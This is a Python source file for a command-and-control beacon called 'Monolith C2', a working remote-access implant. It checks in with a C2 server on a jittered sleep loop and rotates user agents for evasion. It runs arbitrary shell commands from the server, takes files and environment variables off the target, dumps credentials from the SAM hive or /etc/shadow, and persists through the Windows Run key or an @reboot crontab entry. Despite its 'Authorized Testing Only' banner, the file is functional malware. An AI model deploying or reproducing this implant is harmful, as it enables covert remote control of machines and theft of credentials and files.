#!/usr/bin/env python3
"""
Monolith C2 Python Agent/Beacon
Real beacon implementation with encrypted comms
"""
import os
import sys
import json
import time
import uuid
import base64
import random
import socket
import platform
import subprocess
import threading
import traceback
from datetime import datetime

# Try to import requests, fall back to urllib
try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    import urllib.request
    import urllib.error
    HAS_REQUESTS = False

# Try to import encryption
try:
    from cryptography.fernet import Fernet
    HAS_CRYPTO = True
except ImportError:
    HAS_CRYPTO = False


# ============== Configuration ==============
# These will be replaced by payload generator

C2_URL = "http://127.0.0.1:8080/c2/beacon"
BEACON_ID = None  # Will be assigned by server
ENCRYPTION_KEY = None  # Will be received from server
SLEEP_INTERVAL = 30
JITTER = 10
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15",
]


# ============== Utilities ==============

def get_jittered_sleep():
    """Calculate sleep with jitter"""
    jitter_amount = SLEEP_INTERVAL * (JITTER / 100)
    return SLEEP_INTERVAL + random.uniform(-jitter_amount, jitter_amount)


def get_system_info():
    """Collect system information"""
    info = {
        "hostname": socket.gethostname(),
        "username": os.getenv("USER") or os.getenv("USERNAME") or "unknown",
        "os": f"{platform.system()} {platform.release()}",
        "arch": platform.machine(),
        "pid": os.getpid(),
        "ip_internal": get_internal_ip(),
        "integrity": get_integrity_level(),
    }
    return info


def get_internal_ip():
    """Get internal IP address"""
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.connect(("8.8.8.8", 80))
        ip = s.getsockname()[0]
        s.close()
        return ip
    except:
        return "127.0.0.1"


def get_integrity_level():
    """Detect integrity/privilege level"""
    try:
        if platform.system() == "Windows":
            import ctypes
            if ctypes.windll.shell32.IsUserAnAdmin():
                return "high"
            return "medium"
        else:
            if os.geteuid() == 0:
                return "high"
            return "medium"
    except:
        return "unknown"


# ============== HTTP Communication ==============

def http_request(method, url, data=None, headers=None):
    """Make HTTP request (works with or without requests library)"""
    if headers is None:
        headers = {}
    
    headers["User-Agent"] = random.choice(USER_AGENTS)
    headers["Content-Type"] = "application/json"
    
    if HAS_REQUESTS:
        try:
            if method == "POST":
                resp = requests.post(url, json=data, headers=headers, timeout=30)
            else:
                resp = requests.get(url, headers=headers, timeout=30)
            return resp.json()
        except Exception as e:
            return None
    else:
        try:
            req_data = json.dumps(data).encode() if data else None
            req = urllib.request.Request(url, data=req_data, headers=headers, method=method)
            with urllib.request.urlopen(req, timeout=30) as resp:
                return json.loads(resp.read().decode())
        except Exception as e:
            return None


# ============== Encryption ==============

def encrypt_data(data):
    """Encrypt data if key available"""
    if not HAS_CRYPTO or not ENCRYPTION_KEY:
        return base64.b64encode(json.dumps(data).encode()).decode()
    
    try:
        cipher = Fernet(ENCRYPTION_KEY.encode())
        encrypted = cipher.encrypt(json.dumps(data).encode())
        return base64.b64encode(encrypted).decode()
    except:
        return base64.b64encode(json.dumps(data).encode()).decode()


def decrypt_data(data):
    """Decrypt data if key available"""
    if not HAS_CRYPTO or not ENCRYPTION_KEY:
        try:
            return json.loads(base64.b64decode(data.encode()).decode())
        except:
            return data
    
    try:
        decoded = base64.b64decode(data.encode())
        cipher = Fernet(ENCRYPTION_KEY.encode())
        decrypted = cipher.decrypt(decoded)
        return json.loads(decrypted.decode())
    except:
        return data


# ============== Task Execution ==============

def execute_task(task):
    """Execute a task and return result"""
    task_id = task.get("task_id")
    command = task.get("command", "")
    args = task.get("args", [])
    
    result = {
        "task_id": task_id,
        "success": True,
        "output": "",
        "loot_type": None
    }
    
    try:
        if command == "shell":
            # Execute shell command
            cmd = " ".join(args) if args else "whoami"
            output = subprocess.getoutput(cmd)
            result["output"] = output
            
        elif command == "whoami":
            result["output"] = subprocess.getoutput("whoami")
            
        elif command == "pwd":
            result["output"] = os.getcwd()
            
        elif command == "cd":
            if args:
                os.chdir(args[0])
                result["output"] = f"Changed to {os.getcwd()}"
            else:
                result["output"] = os.getcwd()
                
        elif command == "ls" or command == "dir":
            path = args[0] if args else "."
            files = os.listdir(path)
            result["output"] = "\n".join(files)
            
        elif command == "cat" or command == "type":
            if args:
                with open(args[0], 'r') as f:
                    result["output"] = f.read()
            else:
                result["output"] = "No file specified"
                result["success"] = False
                
        elif command == "download":
            # Download file from target
            if args:
                filepath = args[0]
                if os.path.exists(filepath):
                    with open(filepath, 'rb') as f:
                        content = base64.b64encode(f.read()).decode()
                    result["output"] = content
                    result["loot_type"] = "file"
                else:
                    result["output"] = f"File not found: {filepath}"
                    result["success"] = False
            else:
                result["output"] = "No file specified"
                result["success"] = False
                
        elif command == "upload":
            # Upload file to target
            if len(args) >= 2:
                filepath = args[0]
                content = base64.b64decode(args[1])
                with open(filepath, 'wb') as f:
                    f.write(content)
                result["output"] = f"File written to {filepath}"
            else:
                result["output"] = "Usage: upload <path> <base64_content>"
                result["success"] = False
                
        elif command == "screenshot":
            result["output"] = "Screenshot not implemented in basic agent"
            result["success"] = False
            
        elif command == "keylogger":
            result["output"] = "Keylogger not implemented in basic agent"
            result["success"] = False
            
        elif command == "hashdump":
            if platform.system() == "Windows":
                # Try to dump SAM (requires admin)
                result["output"] = subprocess.getoutput("reg save HKLM\\SAM sam.hiv")
                result["loot_type"] = "credentials"
            else:
                # Try to read shadow (requires root)
                try:
                    with open("/etc/shadow", "r") as f:
                        result["output"] = f.read()
                    result["loot_type"] = "credentials"
                except:
                    result["output"] = "Permission denied"
                    result["success"] = False
                    
        elif command == "ps":
            if platform.system() == "Windows":
                result["output"] = subprocess.getoutput("tasklist")
            else:
                result["output"] = subprocess.getoutput("ps aux")
                
        elif command == "ifconfig" or command == "ipconfig":
            if platform.system() == "Windows":
                result["output"] = subprocess.getoutput("ipconfig /all")
            else:
                result["output"] = subprocess.getoutput("ip addr || ifconfig")
                
        elif command == "env":
            result["output"] = "\n".join(f"{k}={v}" for k, v in os.environ.items())
            
        elif command == "sleep":
            # Update sleep interval
            global SLEEP_INTERVAL
            if args:
                SLEEP_INTERVAL = int(args[0])
            result["output"] = f"Sleep interval set to {SLEEP_INTERVAL}s"
            
        elif command == "jitter":
            # Update jitter
            global JITTER
            if args:
                JITTER = int(args[0])
            result["output"] = f"Jitter set to {JITTER}%"
            
        elif command == "exit" or command == "kill":
            result["output"] = "Beacon exiting..."
            return result, True  # Signal to exit
            
        elif command == "persist":
            # Add persistence (basic)
            result["output"] = add_persistence()
            
        else:
            result["output"] = f"Unknown command: {command}"
            result["success"] = False
            
    except Exception as e:
        result["output"] = f"Error: {str(e)}\n{traceback.format_exc()}"
        result["success"] = False
    
    return result, False


def add_persistence():
    """Add basic persistence"""
    try:
        if platform.system() == "Windows":
            # Add to Run key
            agent_path = os.path.abspath(sys.argv[0])
            cmd = f'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v MonolithAgent /t REG_SZ /d "{agent_path}" /f'
            subprocess.run(cmd, shell=True, capture_output=True)
            return "Added to HKCU Run key"
        else:
            # Add crontab entry
            agent_path = os.path.abspath(sys.argv[0])
            cron_entry = f"@reboot python3 {agent_path}\n"
            subprocess.run(f'(crontab -l 2>/dev/null; echo "{cron_entry}") | crontab -', shell=True)
            return "Added to crontab"
    except Exception as e:
        return f"Persistence failed: {e}"


# ============== Main Beacon Loop ==============

def beacon_loop():
    """Main beacon loop"""
    global BEACON_ID, ENCRYPTION_KEY, SLEEP_INTERVAL, JITTER
    
    while True:
        try:
            # Prepare check-in data
            checkin_data = get_system_info()
            if BEACON_ID:
                checkin_data["id"] = BEACON_ID
            
            # Check in with C2
            response = http_request("POST", f"{C2_URL}/checkin", checkin_data)
            
            if response:
                # Handle registration
                if response.get("status") == "registered":
                    BEACON_ID = response.get("id")
                    ENCRYPTION_KEY = response.get("key")
                    SLEEP_INTERVAL = response.get("sleep", 30)
                    JITTER = response.get("jitter", 10)
                    print(f"[+] Registered with beacon ID: {BEACON_ID[:8]}...")
                
                # Handle config updates
                if response.get("sleep"):
                    SLEEP_INTERVAL = response["sleep"]
                if response.get("jitter"):
                    JITTER = response["jitter"]
                
                # Execute tasks
                tasks = response.get("tasks", [])
                for task in tasks:
                    print(f"[*] Executing task: {task.get('command')}")
                    result, should_exit = execute_task(task)
                    
                    # Send result back
                    http_request("POST", f"{C2_URL}/result/{BEACON_ID}", result)
                    
                    if should_exit:
                        print("[!] Exit command received. Shutting down...")
                        return
            
        except Exception as e:
            print(f"[-] Error: {e}")
        
        # Sleep with jitter
        sleep_time = get_jittered_sleep()
        print(f"[*] Sleeping for {sleep_time:.1f}s...")
        time.sleep(sleep_time)


# ============== Entry Point ==============

if __name__ == "__main__":
    print("""
    ╔═══════════════════════════════════════════╗
    ║     MONOLITH C2 - Python Beacon Agent     ║
    ║        For Authorized Testing Only        ║
    ╚═══════════════════════════════════════════╝
    """)
    
    # Allow C2 URL override from command line
    if len(sys.argv) > 1:
        C2_URL = sys.argv[1]
    
    print(f"[*] C2 Server: {C2_URL}")
    print(f"[*] System: {platform.system()} {platform.release()}")
    print(f"[*] User: {os.getenv('USER') or os.getenv('USERNAME')}")
    print(f"[*] Starting beacon loop...")
    print()
    
    try:
        beacon_loop()
    except KeyboardInterrupt:
        print("\n[!] Interrupted. Exiting...")
    except Exception as e:
        print(f"[!] Fatal error: {e}")
